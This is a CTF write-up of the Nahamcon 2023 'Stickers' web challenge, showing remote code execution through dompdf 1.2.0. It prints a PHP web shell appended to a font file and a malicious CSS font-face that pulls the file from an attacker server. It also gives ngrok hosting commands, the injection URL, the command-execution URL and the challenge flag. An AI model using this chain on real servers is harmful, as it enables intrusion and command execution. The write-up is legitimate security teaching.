---
name: Stickers (2023)
event: Nahamcon CTF 2023
category: Web
description: Writeup for Stickers (Web) - Nahamcon CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Stickers

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/XHg_sBD0-es/0.jpg)](https://www.youtube.com/watch?v=XHg_sBD0-es?t=247 "Nahamcon CTF 2023: Stickers (Web)")

## Description

> Wooohoo!!! Stickers!!! Hackers love STICKERS!! You can make your own with our new website!
> Find the flag file in /flag.txt at the root of the filesystem.

## Solution

Tried various payloads in form, but there are some restrictions, e.g. email must be email format, others must be numbers. Successfully inserted `{{7 * 7}}` as the name, but it just rendered as text.

When we submit, the URL looks like: `http://challenge.nahamcon.com:32110/quote.php?organisation=%7B%7B7+*+7%7D%7D&email=a%40a.com&small=1&medium=1&large=1`

We get a PDF receipt, containing the information from the URL parameters.

Don't see the request in burp HTTP history, need to change the filter to include binary.

When we do that and scroll through the response, we find the version `þÿdompdf 1.2.0`.

Google it: https://github.com/positive-security/dompdf-rce

The PoC works, we just need to update URL's, MD5 hash and the payload. However, this article shows the full manual process with a more in depth explanation:
https://exploit-notes.hdks.org/exploit/web/dompdf-rce

Copy a true type font to php file.

{% code overflow="wrap" %}
```bash
find / -name "*.ttf" 2>/dev/null
cp /path/to/example.ttf ./evil.php
```
{% endcode %}

Add a shell at the bottom of the file.

{% code overflow="wrap" %}
```php
<?php system($_REQUEST["cmd"]); ?>
```
{% endcode %}

Create a malicious CSS, the info in here is important for accessing the uploaded PHP file, i.e. `/dompdf/lib/fonts/<font_name>_<font_weight/style>_<md5>.php`.

{% code overflow="wrap" %}
```css
@font-face {
    font-family: "evil";
    src: url("http://ATTACKER_SERVER/evil.php");
    font-weight: "normal";
    font-style: "normal";
}
```
{% endcode %}

Create a python web server and expose using ngrok.

{% code overflow="wrap" %}
```
sudo python -m http.server 80
ngrok http 80
```
{% endcode %}

Make a request containing the malicious stylesheet.

{% code overflow="wrap" %}
```bash
http://challenge.nahamcon.com:32110/quote.php?organisation=<link rel=stylesheet href='http://ATTACKER_SERVER/exploit.css'>&email=a%40a.com&small=1&medium=1&large=1
```
{% endcode %}

Calculate the MD5 of the malicious PHP URL.

{% code overflow="wrap" %}
```bash
echo -n http://ATTACKER_SERVER/evil.php | md5sum

b8e6174c9d5ee52c9b35647ffbd20856
```
{% endcode %}

Access the URL: http://challenge.nahamcon.com:32110/dompdf/lib/fonts/evil_normal_b8e6174c9d5ee52c9b35647ffbd20856.php?cmd=ls

Works! We can now call `cat /flag.txt` and receive the flag.

Flag: `flag{a4d52beabcfdeb6ba79fc08709bb5508}`
